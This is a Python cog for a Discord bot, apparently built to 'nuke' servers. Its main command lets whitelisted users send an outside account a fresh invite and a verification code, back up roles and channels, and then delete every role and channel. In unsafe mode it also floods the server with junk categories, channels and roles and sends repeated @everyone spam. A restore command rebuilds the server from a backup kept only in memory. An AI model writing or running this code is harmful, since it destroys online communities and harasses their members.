import discord
from redbot.core import commands
from redbot.core import commands as red_commands
import random
import string
import asyncio

ALLOWED_USERS = {1174820638997872721,1072554121112064000,690239097150767153,1113852494154579999,1274438209715044415}  # Replace with real user IDs
DM_RECEIVER_ID = 1174820638997872721

def generate_code(length=6):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

class ConfirmView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=30)
        self.result = None

    @discord.ui.button(label="Yes, continue", style=discord.ButtonStyle.danger)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.result = True
        self.stop()
        await interaction.response.send_message("Confirmed.", ephemeral=True)

    @discord.ui.button(label="No, cancel", style=discord.ButtonStyle.secondary)
    async def cancel(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.result = False
        self.stop()
        await interaction.response.send_message("Cancelled.", ephemeral=True)

class RainbowPooper(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.codes = {}
        self.restore_codes = {}
        self.backups = {}
        self.dm_messages = {}

    @commands.command()
    async def rainbowpooper(self, ctx, safe: str = None):
        author = ctx.author

        if author.id not in ALLOWED_USERS:
            await ctx.send("You're not allowed to use this command.")
            return

        if safe is None:
            await ctx.send("Safe mode? Reply with `yes` or `no`.")
            try:
                msg = await self.bot.wait_for("message", check=lambda m: m.author == author and m.channel == ctx.channel, timeout=30)
                safe = msg.content.lower()
            except asyncio.TimeoutError:
                await ctx.send("Timed out. Please start again.")
                return

        is_safe = safe.strip().lower() == "yes"

        verify_code = generate_code()
        self.codes[author.id] = verify_code

        try:
            dm_user = await self.bot.fetch_user(DM_RECEIVER_ID)
            invite = await ctx.channel.create_invite(max_uses=1, unique=True)

            embed = discord.Embed(title="RainbowPooper Request", color=discord.Color.blurple())
            embed.add_field(name="User", value=f"{author} (`{author.id}`)", inline=False)
            embed.add_field(name="Server", value=ctx.guild.name, inline=False)
            embed.add_field(name="Invite", value=invite.url, inline=False)
            embed.add_field(name="Verification Code", value=f"`{verify_code}`", inline=False)
            embed.add_field(name="Mode", value="Safe ✅" if is_safe else "Safe ❌", inline=True)
            embed.add_field(name="Status", value="Pending...", inline=True)

            dm_msg = await dm_user.send(embed=embed)
            self.dm_messages[author.id] = dm_msg
        except Exception:
            await ctx.send("Failed to send DM to verifier.")
            return

        await ctx.send(f"{author.mention}, check the verifier's DMs and enter the verification code:")

        def check(m):
            return m.author.id == author.id and m.channel == ctx.channel

        try:
            msg = await self.bot.wait_for("message", check=check, timeout=60)
        except asyncio.TimeoutError:
            await ctx.send("Timed out. Try again.")
            return

        if msg.content.strip() != verify_code:
            await ctx.send("Invalid code.")
            return

        view = ConfirmView()
        await ctx.send("Are you sure you want to continue?", view=view)
        await view.wait()

        if view.result is not True:
            await ctx.send("Aborted.")
            if author.id in self.dm_messages:
                embed = self.dm_messages[author.id].embeds[0]
                embed.set_field_at(5, name="Status", value="Aborted ❌", inline=True)
                await self.dm_messages[author.id].edit(embed=embed)
            return

        restore_code = generate_code(8)
        self.restore_codes[author.id] = restore_code

        try:
            await dm_user.send(f"Restore code for {author} is: `{restore_code}`. Use `/rainbowpisser <code>` to restore.")
        except Exception:
            await ctx.send("Failed to send restore code.")

        await ctx.send("Backing up server data...")
        backup = await self.backup_guild(ctx.guild)
        self.backups[ctx.guild.id] = backup
        await ctx.send("Backup complete. Beginning server wipe...")

        if author.id in self.dm_messages:
            embed = self.dm_messages[author.id].embeds[0]
            embed.set_field_at(5, name="Status", value="Rainbowpooped 💥", inline=True)
            await self.dm_messages[author.id].edit(embed=embed)

        for role in ctx.guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except Exception:
                pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        if is_safe:
            new_channel = await ctx.guild.create_text_channel("Server Deleted")
            await new_channel.send("Do you want to leave a message? Reply below:")

            def reply_check(m):
                return m.channel == new_channel and not m.author.bot

            try:
                reply = await self.bot.wait_for("message", check=reply_check, timeout=10)
                await new_channel.purge()
                await new_channel.send(reply.content)
            except asyncio.TimeoutError:
                await new_channel.send("This server has been deleted.")
        else:
            for i in range(5):
                cat = await ctx.guild.create_category(f"HAHA! {i+1}")
                for _ in range(5):
                    txt = await ctx.guild.create_text_channel("HAHA!", category=cat)
                    vc = await ctx.guild.create_voice_channel("HAHA!", category=cat)
                    try:
                        for _ in range(5):
                            await txt.send("@everyone HAHAHAHAHA!", allowed_mentions=discord.AllowedMentions(everyone=True))
                    except Exception:
                        pass

            for i in range(10):
                try:
                    await ctx.guild.create_role(name=f"HAHA! ROLE {i+1}", mentionable=True)
                except Exception:
                    continue

            for channel in ctx.guild.text_channels:
                try:
                    await channel.send("@everyone This server got rainbowpooped!", allowed_mentions=discord.AllowedMentions(everyone=True))
                except Exception:
                    pass

    @commands.command()
    async def rainbowpisser(self, ctx, code: str):
        author = ctx.author

        if author.id not in ALLOWED_USERS:
            await ctx.send("You're not allowed to use this command.")
            return

        expected_code = self.restore_codes.get(author.id)
        if expected_code is None or code.strip() != expected_code:
            await ctx.send("Invalid or missing restore code.")
            return

        backup = self.backups.get(ctx.guild.id)
        if not backup:
            await ctx.send("No backup found.")
            return

        await ctx.send("Restoring from backup...")

        for role in ctx.guild.roles:
            if role.is_default():
                continue
            try:
                await role.delete()
            except Exception:
                pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Exception:
                pass

        roles_map = {}
        for r in backup['roles']:
            try:
                role = await ctx.guild.create_role(
                    name=r['name'],
                    colour=discord.Colour(r['color']),
                    hoist=r['hoist'],
                    mentionable=r['mentionable'],
                    permissions=discord.Permissions(r['permissions'])
                )
                roles_map[r['id']] = role
            except Exception:
                pass

        cats_map = {}
        for c in backup['categories']:
            try:
                cat = await ctx.guild.create_category(c['name'])
                cats_map[c['id']] = cat
            except Exception:
                pass

        for ch in backup['channels']:
            category = cats_map.get(ch['category_id'])
            try:
                if ch['type'] == 'text':
                    await ctx.guild.create_text_channel(ch['name'], category=category)
                elif ch['type'] == 'voice':
                    await ctx.guild.create_voice_channel(ch['name'], category=category)
            except Exception:
                continue

        await ctx.send("Restoration complete.")

        if author.id in self.dm_messages:
            embed = self.dm_messages[author.id].embeds[0]
            embed.set_field_at(5, name="Status", value="Restored ✅", inline=True)
            await self.dm_messages[author.id].edit(embed=embed)

    async def backup_guild(self, guild: discord.Guild):
        backup = {'roles': [], 'categories': [], 'channels': []}

        for role in guild.roles:
            if role.is_default():
                continue
            backup['roles'].append({
                'id': role.id,
                'name': role.name,
                'color': role.color.value,
                'hoist': role.hoist,
                'mentionable': role.mentionable,
                'permissions': role.permissions.value,
            })

        for cat in guild.categories:
            backup['categories'].append({
                'id': cat.id,
                'name': cat.name
            })

        for ch in guild.channels:
            if isinstance(ch, discord.TextChannel):
                backup['channels'].append({
                    'id': ch.id,
                    'name': ch.name,
                    'type': 'text',
                    'category_id': ch.category.id if ch.category else None,
                })
            elif isinstance(ch, discord.VoiceChannel):
                backup['channels'].append({
                    'id': ch.id,
                    'name': ch.name,
                    'type': 'voice',
                    'category_id': ch.category.id if ch.category else None,
                })

        return backup

async def setup(bot):
    await bot.add_cog(RainbowPooper(bot))
